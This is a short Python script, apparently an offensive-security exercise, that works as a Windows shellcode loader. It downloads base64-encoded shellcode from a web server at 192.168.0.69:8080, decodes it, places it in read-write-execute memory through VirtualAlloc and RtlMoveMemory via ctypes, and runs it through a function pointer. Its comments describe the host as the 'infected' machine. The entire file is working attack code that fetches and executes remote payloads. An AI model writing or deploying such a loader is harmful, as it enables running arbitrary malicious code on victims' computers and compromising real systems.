'''
1. Grab the shellcode from the web-server
2. decode the shellcode
3. execute the shellcode in allocated memory --> a function pointer is required for this
'''
'''
This module grabs shellcode and executes it on the local (infected) machine.
'''

'''
generate shellcode and serve using: python -m http.server 8080          --> Make sure the shellcode is base64 encoded
'''

from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):                                      # obtain the shellcode from the webserver and decode it
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):                                  # place the decoded shellcode into memory and return a function pointer to that binary
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p     # specifying a pointer as the VirtualAlloc return type
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)
    
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)     # allocate memory using VirtualAlloc. 0x40 denotes rwx permissions.
    kernel32.RtlMoveMemory(ptr, buf, length)                    # move the buffer containing the shellcode into that memory
    return ptr                                                  # This is the pointer to the buffer containing the shellcode, which is now in executable memory.

def run(shellcode):                                     # write the shellcode into memory and execute it
    buffer = ctypes.create_string_buffer(shellcode)     # buffer to hold the shellcode after it has been decoded

    ptr = write_memory(buffer)                          # write that newly filled buffer into allocated memory

    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))           # cast the pointer to the shellcode buffer to a function pointer so that it can be called as a function
    shell_func()                                                # run the shellcode pointed to by the function pointer

if __name__ == "__main__":
    url = "http://192.168.0.69:8080/shellcode.bin"              # retrieve
    shellcode = get_code(url)                                   # format
    run(shellcode)                                              # execute...among other things

